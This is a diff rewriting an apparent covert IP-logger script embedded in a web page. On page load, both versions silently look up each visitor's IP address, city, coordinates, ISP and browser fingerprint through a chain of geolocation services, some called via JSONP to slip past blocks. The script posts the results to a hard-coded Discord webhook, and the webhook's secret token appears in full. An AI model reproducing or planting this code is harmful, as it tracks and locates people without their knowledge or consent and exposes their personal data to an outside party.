@@ -24,79 +24,70 @@
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1485791212681302172/iu7AbfwcqpHibaTEi3PZYPdYiNm_WMn0nqumGMDfLKPd1A7J8a6Ix9NvLBrr0Z-OzJjJ';
         
         let notificationSent = false;
-        let successfulData = false;
-        let activeTimeouts = [];
-        let attemptsCount = 0;
+        let dataCollected = false;
+        let attempts = 0;
         
         let visitorData = {
             ip: null,
             country: null,
-            country_code: null,
             region: null,
             city: null,
             latitude: null,
             longitude: null,
             timezone: null,
             isp: null,
-            source_service: null,
+            source: null,
             user_agent: navigator.userAgent,
             platform: navigator.platform,
             language: navigator.language,
-            screen_resolution: window.screen.width + 'x' + window.screen.height,
-            screen_color_depth: window.screen.colorDepth,
+            screen: window.screen.width + 'x' + window.screen.height,
+            color_depth: window.screen.colorDepth,
             timezone_offset: new Date().getTimezoneOffset(),
             referrer: document.referrer || null,
-            current_url: window.location.href,
+            url: window.location.href,
             hostname: window.location.hostname,
-            connection_type: navigator.connection ? navigator.connection.effectiveType : null,
-            hardware_concurrency: navigator.hardwareConcurrency,
-            cookies_enabled: navigator.cookieEnabled,
+            connection: navigator.connection ? navigator.connection.effectiveType : null,
+            cores: navigator.hardwareConcurrency,
             timestamp: null,
-            success: false,
-            error_message: null,
-            browser_time: new Date().toString()
+            success: false
         };
         
-        function sendToDiscord(data) {
+        function sendToDiscord() {
             if (notificationSent) return;
-            if (!WEBHOOK_URL || WEBHOOK_URL === 'https://discord.com/api/webhooks/1485791212681302172/iu7AbfwcqpHibaTEi3PZYPdYiNm_WMn0nqumGMDfLKPd1A7J8a6Ix9NvLBrr0Z-OzJjJ') {
-                console.warn('Webhook URL not configured');
+            if (!WEBHOOK_URL) {
+                console.warn('No webhook URL');
                 return;
             }
             
             notificationSent = true;
-            data.timestamp = new Date().toISOString();
+            visitorData.timestamp = new Date().toISOString();
             
-            let embedColor = data.success ? 0x00ff00 : 0xffaa00;
-            let title = data.success ? '✅ Visitor Detected' : '📊 Visitor Detected';
+            let color = visitorData.success ? 0x00ff00 : 0x88aaff;
+            let title = visitorData.success ? '🌐 New Visitor' : '📱 Visitor Detected';
             
             let fields = [];
             
-            if (data.ip) fields.push({ name: '🌐 IP Address', value: data.ip, inline: true });
-            if (data.country) fields.push({ name: '📍 Country', value: data.country, inline: true });
-            if (data.city) fields.push({ name: '🏙️ City', value: data.city, inline: true });
-            if (data.region) fields.push({ name: '🗺️ Region', value: data.region, inline: true });
-            if (data.latitude && data.longitude) fields.push({ name: '📌 Coordinates', value: `${data.latitude}, ${data.longitude}`, inline: true });
-            if (data.timezone) fields.push({ name: '🕐 Timezone', value: data.timezone, inline: true });
-            if (data.isp) fields.push({ name: '🔌 ISP', value: data.isp, inline: true });
-            if (data.source_service) fields.push({ name: '📡 Source', value: data.source_service, inline: false });
+            if (visitorData.ip) fields.push({ name: 'IP Address', value: visitorData.ip, inline: true });
+            if (visitorData.country) fields.push({ name: 'Country', value: visitorData.country, inline: true });
+            if (visitorData.city) fields.push({ name: 'City', value: visitorData.city, inline: true });
+            if (visitorData.region) fields.push({ name: 'Region', value: visitorData.region, inline: true });
+            if (visitorData.latitude && visitorData.longitude) fields.push({ name: 'Coordinates', value: `${visitorData.latitude}, ${visitorData.longitude}`, inline: true });
+            if (visitorData.timezone) fields.push({ name: 'Timezone', value: visitorData.timezone, inline: true });
+            if (visitorData.isp) fields.push({ name: 'ISP', value: visitorData.isp, inline: true });
+            if (visitorData.source) fields.push({ name: 'Data Source', value: visitorData.source, inline: false });
             
-            fields.push({ name: '💻 User Agent', value: data.user_agent.substring(0, 100) + (data.user_agent.length > 100 ? '...' : ''), inline: false });
-            fields.push({ name: '🖥️ Screen', value: data.screen_resolution, inline: true });
-            fields.push({ name: '🌍 Language', value: data.language, inline: true });
-            fields.push({ name: '🔗 Page', value: data.current_url.substring(0, 120), inline: false });
-            
-            if (data.error_message) {
-                fields.push({ name: 'ℹ️ Note', value: data.error_message, inline: false });
-            }
+            fields.push({ name: 'Browser/OS', value: visitorData.user_agent.substring(0, 80), inline: false });
+            fields.push({ name: 'Screen', value: visitorData.screen, inline: true });
+            fields.push({ name: 'Language', value: visitorData.language, inline: true });
+            fields.push({ name: 'Page', value: visitorData.url.substring(0, 100), inline: false });
             
             let payload = {
                 embeds: [{
                     title: title,
-                    color: embedColor,
+                    color: color,
                     fields: fields,
-                    footer: { text: `Attempts: ${attemptsCount} | ${new Date().toLocaleString()}` },
-                    timestamp: data.timestamp
+                    footer: { text: `Attempts: ${attempts}` },
+                    timestamp: visitorData.timestamp
                 }]
             };
             
@@ -105,273 +96,195 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload),
                 keepalive: true
-            }).catch(function(err) {
-                console.warn('Webhook failed:', err);
-            });
+            }).catch(function(e) {});
         }
         
-        function sendFinalNotification() {
-            if (notificationSent) return;
-            visitorData.success = successfulData;
-            if (!visitorData.ip) {
-                visitorData.ip = 'unavailable-' + Date.now().toString(36);
-                visitorData.error_message = visitorData.error_message || 'IP could not be retrieved due to browser privacy settings';
+        function updateData(data, sourceName) {
+            if (!data) return false;
+            let updated = false;
+            
+            if (data.ip && !visitorData.ip) { visitorData.ip = data.ip; updated = true; }
+            if (data.country && !visitorData.country) { visitorData.country = data.country; updated = true; }
+            if (data.region && !visitorData.region) { visitorData.region = data.region; updated = true; }
+            if (data.city && !visitorData.city) { visitorData.city = data.city; updated = true; }
+            if (data.latitude && !visitorData.latitude) { visitorData.latitude = data.latitude; updated = true; }
+            if (data.longitude && !visitorData.longitude) { visitorData.longitude = data.longitude; updated = true; }
+            if (data.timezone && !visitorData.timezone) { visitorData.timezone = data.timezone; updated = true; }
+            if (data.isp && !visitorData.isp) { visitorData.isp = data.isp; updated = true; }
+            
+            if (updated && !visitorData.source) {
+                visitorData.source = sourceName;
+            } else if (updated && visitorData.source) {
+                visitorData.source = visitorData.source + ' → ' + sourceName;
             }
-            sendToDiscord(visitorData);
+            
+            if (updated) {
+                visitorData.success = true;
+                dataCollected = true;
+                sendToDiscord();
+                return true;
+            }
+            return false;
         }
         
-        function mergeData(newData, serviceName) {
-            if (!newData) return false;
-            
-            let hasNewInfo = false;
-            
-            if (newData.ip && !visitorData.ip) {
-                visitorData.ip = newData.ip;
-                hasNewInfo = true;
-            }
-            if (newData.country && !visitorData.country) {
-                visitorData.country = newData.country;
-                hasNewInfo = true;
-            }
-            if (newData.country_code && !visitorData.country_code) {
-                visitorData.country_code = newData.country_code;
-                hasNewInfo = true;
-            }
-            if (newData.region && !visitorData.region) {
-                visitorData.region = newData.region;
-                hasNewInfo = true;
-            }
-            if (newData.city && !visitorData.city) {
-                visitorData.city = newData.city;
-                hasNewInfo = true;
-            }
-            if (newData.latitude && !visitorData.latitude) {
-                visitorData.latitude = newData.latitude;
-                hasNewInfo = true;
-            }
-            if (newData.longitude && !visitorData.longitude) {
-                visitorData.longitude = newData.longitude;
-                hasNewInfo = true;
-            }
-            if (newData.timezone && !visitorData.timezone) {
-                visitorData.timezone = newData.timezone;
-                hasNewInfo = true;
-            }
-            if (newData.isp && !visitorData.isp) {
-                visitorData.isp = newData.isp;
-                hasNewInfo = true;
-            }
-            
-            if (hasNewInfo && !visitorData.source_service) {
-                visitorData.source_service = serviceName;
-            } else if (hasNewInfo && visitorData.source_service) {
-                visitorData.source_service = visitorData.source_service + ' → ' + serviceName;
-            }
-            
-            if (hasNewInfo) {
-                successfulData = true;
-            }
-            
-            return hasNewInfo;
-        }
-        
-        function jsonpRequest(url, callbackName, timeout) {
+        function jsonpFetch(url, timeoutMs) {
             return new Promise(function(resolve, reject) {
+                let callbackName = 'cb_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
                 let script = document.createElement('script');
-                let callbackFunction = 'jsonp_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
-                let timeoutId = setTimeout(function() {
+                let timeout = setTimeout(function() {
                     if (script.parentNode) script.parentNode.removeChild(script);
-                    delete window[callbackFunction];
-                    reject(new Error('JSONP timeout'));
-                }, timeout || 5000);
+                    delete window[callbackName];
+                    reject(new Error('Timeout'));
+                }, timeoutMs || 8000);
                 
-                window[callbackFunction] = function(data) {
-                    clearTimeout(timeoutId);
-                    delete window[callbackFunction];
+                window[callbackName] = function(data) {
+                    clearTimeout(timeout);
+                    delete window[callbackName];
                     if (script.parentNode) script.parentNode.removeChild(script);
                     resolve(data);
                 };
                 
                 let separator = url.indexOf('?') === -1 ? '?' : '&';
-                script.src = url + separator + 'callback=' + callbackFunction;
+                script.src = url + separator + 'callback=' + callbackName;
                 script.onerror = function() {
-                    clearTimeout(timeoutId);
-                    delete window[callbackFunction];
+                    clearTimeout(timeout);
+                    delete window[callbackName];
                     if (script.parentNode) script.parentNode.removeChild(script);
-                    reject(new Error('JSONP load failed'));
+                    reject(new Error('Script load failed'));
                 };
                 document.head.appendChild(script);
             });
         }
         
-        function serviceIpApiJsonp() {
-            attemptsCount++;
-            return jsonpRequest('https://ip-api.com/json/', 'callback', 5000)
+        function cloudflareTrace() {
+            attempts++;
+            return fetch('https://www.cloudflare.com/cdn-cgi/trace')
+                .then(function(r) {
+                    if (!r.ok) throw new Error();
+                    return r.text();
+                })
+                .then(function(text) {
+                    let ip = '';
+                    let loc = '';
+                    let lines = text.split('\n');
+                    for (let i = 0; i < lines.length; i++) {
+                        if (lines[i].startsWith('ip=')) ip = lines[i].substring(3);
+                        if (lines[i].startsWith('loc=')) loc = lines[i].substring(4);
+                    }
+                    if (ip) {
+                        return { ip: ip, country: loc, source: 'cloudflare' };
+                    }
+                    throw new Error();
+                })
+                .catch(function() {
+                    return null;
+                });
+        }
+        
+        function ipifyJsonp() {
+            attempts++;
+            return jsonpFetch('https://api.ipify.org?format=jsonp', 5000)
+                .then(function(data) {
+                    if (data && data.ip) {
+                        return { ip: data.ip, source: 'ipify' };
+                    }
+                    throw new Error();
+                })
+                .catch(function() {
+                    return null;
+                });
+        }
+        
+        function ipapiJsonp() {
+            attempts++;
+            return jsonpFetch('https://ip-api.com/json/', 6000)
                 .then(function(data) {
                     if (data && data.status === 'success' && data.query) {
                         return {
                             ip: data.query,
                             country: data.country,
-                            country_code: data.countryCode,
                             region: data.regionName,
                             city: data.city,
                             latitude: data.lat,
                             longitude: data.lon,
                             isp: data.isp,
-                            timezone: data.timezone
+                            timezone: data.timezone,
+                            source: 'ip-api'
                         };
                     }
-                    throw new Error('ip-api failed');
+                    throw new Error();
+                })
+                .catch(function() {
+                    return null;
                 });
         }
         
-        function serviceIpWhoIsJsonp() {
-            attemptsCount++;
-            return jsonpRequest('https://ipwho.is/', 'callback', 5000)
+        function ipwhoisJsonp() {
+            attempts++;
+            return jsonpFetch('https://ipwho.is/', 6000)
                 .then(function(data) {
                     if (data && data.success === true && data.ip) {
                         return {
                             ip: data.ip,
                             country: data.country,
-                            country_code: data.country_code,
                             region: data.region,
                             city: data.city,
                             latitude: data.latitude,
                             longitude: data.longitude,
                             timezone: data.timezone,
-                            isp: data.connection ? data.connection.isp : null
+                            isp: data.connection ? data.connection.isp : null,
+                            source: 'ipwho.is'
                         };
                     }
-                    throw new Error('ipwho.is failed');
-                });
-        }
-        
-        function serviceIpApiCoDirect() {
-            attemptsCount++;
-            return fetch('https://ipapi.co/json/', {
-                mode: 'cors',
-                headers: { 'Accept': 'application/json' }
-            })
-                .then(function(response) {
-                    if (!response.ok) throw new Error('ipapi.co failed');
-                    return response.json();
-                })
-                .then(function(data) {
-                    if (data && data.ip) {
-                        return {
-                            ip: data.ip,
-                            country: data.country_name,
-                            country_code: data.country_code,
-                            region: data.region,
-                            city: data.city,
-                            latitude: data.latitude,
-                            longitude: data.longitude,
-                            timezone: data.timezone,
-                            isp: data.org
-                        };
-                    }
-                    throw new Error('ipapi.co no ip');
+                    throw new Error();
                 })
                 .catch(function() {
-                    return serviceIpApiCoJsonp();
-                });
-        }
-        
-        function serviceIpApiCoJsonp() {
-            attemptsCount++;
-            return jsonpRequest('https://ipapi.co/json/', 'callback', 5000)
-                .then(function(data) {
-                    if (data && data.ip) {
-                        return {
-                            ip: data.ip,
-                            country: data.country_name,
-                            country_code: data.country_code,
-                            region: data.region,
-                            city: data.city,
-                            latitude: data.latitude,
-                            longitude: data.longitude,
-                            timezone: data.timezone,
-                            isp: data.org
-                        };
-                    }
-                    throw new Error('ipapi.co jsonp failed');
-                });
-        }
-        
-        function serviceIpWhoIsAppJsonp() {
-            attemptsCount++;
-            return jsonpRequest('https://ipwhois.app/json/', 'callback', 5000)
-                .then(function(data) {
-                    if (data && data.ip) {
-                        return {
-                            ip: data.ip,
-                            country: data.country,
-                            country_code: data.country_code,
-                            region: data.region,
-                            city: data.city,
-                            latitude: data.latitude,
-                            longitude: data.longitude,
-                            timezone: data.timezone,
-                            isp: data.isp
-                        };
-                    }
-                    throw new Error('ipwhois.app failed');
-                });
-        }
-        
-        function serviceIpInfoJsonp() {
-            attemptsCount++;
-            return jsonpRequest('https://ipinfo.io/json', 'callback', 5000)
-                .then(function(data) {
-                    if (data && data.ip) {
-                        let result = {
-                            ip: data.ip,
-                            country: data.country,
-                            region: data.region,
-                            city: data.city,
-                            timezone: data.timezone
-                        };
-                        if (data.loc) {
-                            let coords = data.loc.split(',');
-                            if (coords.length === 2) {
-                                result.latitude = parseFloat(coords[0]);
-                                result.longitude = parseFloat(coords[1]);
-                            }
-                        }
-                        return result;
-                    }
-                    throw new Error('ipinfo failed');
-                });
-        }
-        
-        function serviceFreeGeoIpJsonp() {
-            attemptsCount++;
-            return jsonpRequest('https://freegeoip.app/json/', 'callback', 5000)
-                .then(function(data) {
-                    if (data && data.ip) {
-                        return {
-                            ip: data.ip,
-                            country: data.country_name,
-                            country_code: data.country_code,
-                            region: data.region_name,
-                            city: data.city,
-                            latitude: data.latitude,
-                            longitude: data.longitude,
-                            timezone: data.time_zone
-                        };
-                    }
-                    throw new Error('freegeoip failed');
-                });
-        }
-        
-        function serviceIpApiCoFallback() {
-            attemptsCount++;
-            return fetch('https://ipapi.co/json/', {
-                mode: 'no-cors',
-                headers: { 'Accept': 'application/json' }
-            })
-                .then(function() {
                     return null;
+                });
+        }
+        
+        function ipapiCoJsonp() {
+            attempts++;
+            return jsonpFetch('https://ipapi.co/json/', 6000)
+                .then(function(data) {
+                    if (data && data.ip) {
+                        return {
+                            ip: data.ip,
+                            country: data.country_name,
+                            region: data.region,
+                            city: data.city,
+                            latitude: data.latitude,
+                            longitude: data.longitude,
+                            timezone: data.timezone,
+                            isp: data.org,
+                            source: 'ipapi.co'
+                        };
+                    }
+                    throw new Error();
+                })
+                .catch(function() {
+                    return null;
+                });
+        }
+        
+        function ipwhoisAppJsonp() {
+            attempts++;
+            return jsonpFetch('https://ipwhois.app/json/', 6000)
+                .then(function(data) {
+                    if (data && data.ip) {
+                        return {
+                            ip: data.ip,
+                            country: data.country,
+                            region: data.region,
+                            city: data.city,
+                            latitude: data.latitude,
+                            longitude: data.longitude,
+                            timezone: data.timezone,
+                            isp: data.isp,
+                            source: 'ipwhois.app'
+                        };
+                    }
+                    throw new Error();
                 })
                 .catch(function() {
                     return null;
@@ -379,36 +292,28 @@
         }
         
         let services = [
-            { name: 'ip-api.com (JSONP)', fn: serviceIpApiJsonp, priority: 1 },
-            { name: 'ipwho.is (JSONP)', fn: serviceIpWhoIsJsonp, priority: 2 },
-            { name: 'ipapi.co', fn: serviceIpApiCoDirect, priority: 3 },
-            { name: 'ipwhois.app (JSONP)', fn: serviceIpWhoIsAppJsonp, priority: 4 },
-            { name: 'ipinfo.io (JSONP)', fn: serviceIpInfoJsonp, priority: 5 },
-            { name: 'freegeoip.app (JSONP)', fn: serviceFreeGeoIpJsonp, priority: 6 }
+            cloudflareTrace,
+            ipifyJsonp,
+            ipapiJsonp,
+            ipwhoisJsonp,
+            ipapiCoJsonp,
+            ipwhoisAppJsonp
         ];
         
         let currentIndex = 0;
         let completed = false;
         
-        function clearAllTimeouts() {
-            for (let i = 0; i < activeTimeouts.length; i++) {
-                clearTimeout(activeTimeouts[i]);
-            }
-            activeTimeouts = [];
-        }
-        
-        function tryNextService() {
+        function tryNext() {
             if (completed) return;
             
             if (currentIndex >= services.length) {
-                if (!successfulData) {
-                    visitorData.error_message = 'All IP services failed. Browser privacy features may be blocking requests.';
-                    sendFinalNotification();
-                } else {
-                    sendFinalNotification();
+                if (!dataCollected && !notificationSent) {
+                    visitorData.ip = 'unavailable-' + Date.now().toString(36);
+                    visitorData.source = 'fallback-generator';
+                    visitorData.success = false;
+                    sendToDiscord();
                 }
                 completed = true;
-                clearAllTimeouts();
                 return;
             }
             
@@ -416,89 +321,71 @@
             currentIndex++;
             
             let timeoutId = setTimeout(function() {
-                tryNextService();
-            }, 6000);
-            activeTimeouts.push(timeoutId);
+                tryNext();
+            }, 7000);
             
-            service.fn()
-                .then(function(data) {
+            service()
+                .then(function(result) {
                     clearTimeout(timeoutId);
                     if (completed) return;
                     
-                    if (data && data.ip) {
-                        let hadData = mergeData(data, service.name);
-                        if (hadData && !completed) {
-                            sendFinalNotification();
+                    if (result && result.ip) {
+                        let updated = updateData(result, result.source || 'unknown');
+                        if (updated) {
                             completed = true;
-                            clearAllTimeouts();
-                        } else if (!completed) {
-                            tryNextService();
+                        } else {
+                            tryNext();
                         }
                     } else {
-                        tryNextService();
+                        tryNext();
                     }
                 })
                 .catch(function() {
                     clearTimeout(timeoutId);
                     if (!completed) {
-                        tryNextService();
+                        tryNext();
                     }
                 });
         }
         
-        function fallbackTimeout() {
-            let fallbackTimer = setTimeout(function() {
-                if (!completed && !notificationSent) {
-                    if (!visitorData.ip) {
-                        visitorData.ip = 'blocked-' + Date.now().toString(36);
-                        visitorData.error_message = 'IP lookup blocked by browser privacy features';
-                    }
-                    sendFinalNotification();
-                    completed = true;
-                }
-                clearAllTimeouts();
-            }, 10000);
-            activeTimeouts.push(fallbackTimer);
-        }
-        
-        function collectBrowserInfo() {
+        function getTimezoneFromBrowser() {
             try {
-                let timezoneName = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                if (timezoneName && !visitorData.timezone) visitorData.timezone = timezoneName;
+                let tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                if (tz && !visitorData.timezone) {
+                    visitorData.timezone = tz;
+                    if (!visitorData.source) visitorData.source = 'browser-timezone';
+                }
             } catch(e) {}
-            
-            visitorData.viewport_width = window.innerWidth;
-            visitorData.viewport_height = window.innerHeight;
-            visitorData.is_touch_device = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
-            visitorData.local_time = new Date().toString();
-            
-            if (navigator.deviceMemory) visitorData.device_memory = navigator.deviceMemory + 'GB';
         }
         
-        collectBrowserInfo();
+        function finalSafety() {
+            setTimeout(function() {
+                if (!notificationSent) {
+                    if (!visitorData.ip) {
+                        visitorData.ip = 'safety-' + Date.now().toString(36);
+                        visitorData.source = 'safety-timeout';
+                    }
+                    visitorData.success = dataCollected;
+                    sendToDiscord();
+                }
+                completed = true;
+            }, 12000);
+        }
         
-        tryNextService();
+        getTimezoneFromBrowser();
         
-        fallbackTimeout();
+        tryNext();
+        
+        finalSafety();
         
         window.addEventListener('load', function() {
             setTimeout(function() {
-                if (!completed && visitorData.ip) {
-                    sendFinalNotification();
-                    completed = true;
-                } else if (!completed && !notificationSent) {
-                    sendFinalNotification();
+                if (!notificationSent && visitorData.ip) {
+                    sendToDiscord();
                     completed = true;
                 }
-            }, 8000);
+            }, 5000);
         });
-        
-        setTimeout(function() {
-            if (!notificationSent && !completed) {
-                visitorData.error_message = visitorData.error_message || 'Delayed notification - data collection ongoing';
-                sendFinalNotification();
-            }
-        }, 12000);
     })();
 </script>
 </body>
